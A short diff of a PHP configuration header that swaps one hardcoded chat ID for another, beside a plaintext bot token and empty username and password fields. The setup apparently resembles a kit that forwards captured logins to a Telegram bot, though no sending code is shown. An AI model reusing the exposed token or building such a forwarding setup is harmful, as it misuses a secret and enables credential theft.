@@ -5,7 +5,7 @@
  */
 
 $bot_token = '8881094788:AAG8OLVvIRa-ICIRRj-0maqrpLnhxiemQus';
-$chat_id = '8259867883';
+$chat_id = '8881094788';
 
 $username = '';
 $password = '';
